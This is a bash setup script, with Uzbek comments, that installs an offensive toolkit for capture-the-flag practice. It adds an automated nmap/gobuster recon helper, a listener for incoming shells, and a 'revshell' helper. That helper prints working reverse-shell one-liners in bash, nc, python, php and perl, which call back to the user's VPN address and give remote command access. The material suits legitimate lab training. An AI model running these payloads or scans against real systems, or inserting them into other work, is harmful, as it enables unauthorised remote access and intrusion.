#!/bin/bash
# ctf_powerpack.sh — cybermentor hujum-bazasiga qulaylik asboblari
set -u
export DEBIAN_FRONTEND=noninteractive
export PATH="$HOME/.local/bin:$PATH"
mkdir -p ~/.local/bin ~/ctf/targets ~/ctf/resources

echo "[1] pwncat-cs (barqaror shell) + qo'shimchalar..."
python3 -m pip install --break-system-packages -q pwncat-cs 2>&1 | tail -1 || true
sudo apt-get install -y -qq rlwrap httpie >/dev/null 2>&1 && echo "  ✓ rlwrap + httpie"

echo "[2] PayloadsAllTheThings (reference)..."
[ -d ~/ctf/resources/PayloadsAllTheThings ] || git clone --depth 1 -q https://github.com/swisskyrepo/PayloadsAllTheThings ~/ctf/resources/PayloadsAllTheThings 2>/dev/null && echo "  ✓ PayloadsAllTheThings"

echo "[3] Helper skriptlar..."

cat > ~/.local/bin/recon <<'PP_RECON'
#!/bin/bash
# recon <target> — avtomatik razvedka (nmap + web enum)
T="${1:?usage: recon <target-ip>}"; D="$HOME/ctf/targets/$T"; mkdir -p "$D"
echo "[*] Recon -> $D"
echo "[1/3] Nmap tez (top-1000)..."; nmap -Pn -T4 --top-ports 1000 -oN "$D/nmap-quick.txt" "$T" >/dev/null; grep -E 'open' "$D/nmap-quick.txt" | grep -v Warning
echo "[2/3] Nmap to'liq (-p- -sVC) fonda..."; nmap -Pn -sVC -p- -T4 -oN "$D/nmap-full.txt" "$T" >/dev/null 2>&1 &
NPID=$!
echo "[3/3] Web enum (ochiq http portlar)..."
for p in $(grep -oE '^[0-9]+/tcp +open' "$D/nmap-quick.txt" | grep -oE '^[0-9]+'); do
  sch=http; { [ "$p" = 443 ] || [ "$p" = 8443 ]; } && sch=https
  if grep -E "^$p/tcp.*http" "$D/nmap-quick.txt" >/dev/null 2>&1 || [ "$p" = 80 ] || [ "$p" = 8080 ] || [ "$p" = 8000 ] || [ "$sch" = https ]; then
    echo "   [web] $sch://$T:$p"
    whatweb -q "$sch://$T:$p" > "$D/whatweb-$p.txt" 2>/dev/null
    gobuster dir -q -k -t 40 -u "$sch://$T:$p" -w ~/wordlists/common.txt -o "$D/gobuster-$p.txt" 2>/dev/null &
  fi
done
wait
echo "[✓] Tugadi. Natijalar:"; ls -1 "$D" | sed 's/^/   /'
echo "   To'liq nmap: cat $D/nmap-full.txt"
PP_RECON

cat > ~/.local/bin/revshell <<'PP_REV'
#!/bin/bash
# revshell [port] — VPN IP bilan reverse shell payloadlar
LHOST=$(ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[0-9.]+'); [ -z "$LHOST" ] && LHOST="VPN-YOQ"
LPORT="${1:-4444}"
echo "=== Reverse Shell (LHOST=$LHOST  LPORT=$LPORT) ==="
echo "[bash]   bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
echo "[bash-b64] echo YmFzaCAtaSA+JiAvZGV2L3RjcC8=... (revshells.com dan)"
echo "[nc]     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
echo "[python] python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"
echo "[php]    php -r '\$s=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
echo "[perl]   perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
echo ""
echo "Listener:  listen $LPORT"
echo "Shell barqarorlash:  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  keyin Ctrl+Z; stty raw -echo; fg; export TERM=xterm"
PP_REV

cat > ~/.local/bin/listen <<'PP_LISTEN'
#!/bin/bash
LPORT="${1:-4444}"
if command -v pwncat-cs >/dev/null 2>&1; then
  echo "[pwncat] :$LPORT kutmoqda (auto-stabil shell, upload/download bor)..."
  pwncat-cs -lp "$LPORT"
else
  echo "[nc] :$LPORT kutmoqda..."; rlwrap nc -lvnp "$LPORT" 2>/dev/null || nc -lvnp "$LPORT"
fi
PP_LISTEN

cat > ~/.local/bin/ctf <<'PP_CTF'
#!/bin/bash
tmux attach -t ctf 2>/dev/null || tmux new -s ctf
PP_CTF

cat > ~/.local/bin/flag <<'PP_FLAG'
#!/bin/bash
# flag <matn> — topilgan flag/credential'ni yozib qo'yadi
[ -z "$*" ] && { echo "usage: flag <flag yoki eslatma>"; cat ~/ctf/flags.txt 2>/dev/null; exit 0; }
echo "$(date '+%m-%d %H:%M') | $*" >> ~/ctf/flags.txt
echo "✓ saqlandi -> ~/ctf/flags.txt"; tail -8 ~/ctf/flags.txt
PP_FLAG

chmod +x ~/.local/bin/{recon,revshell,listen,ctf,flag}

# tmux qulaylik
cat > ~/.tmux.conf <<'PP_TMUX'
set -g mouse on
set -g history-limit 50000
set -g default-terminal "screen-256color"
setw -g mode-keys vi
PP_TMUX

echo "  ✓ recon, revshell, listen, ctf, flag + .tmux.conf"

echo
echo "==== TEKSHIRUV ===="
for t in recon revshell listen ctf flag pwncat-cs http tmux rlwrap; do
  command -v "$t" >/dev/null 2>&1 && printf "  ✓ %s\n" "$t" || printf "  ✗ %s\n" "$t"
done
[ -d ~/ctf/resources/PayloadsAllTheThings ] && echo "  ✓ PayloadsAllTheThings"
echo "==== POWER PACK TAYYOR ===="
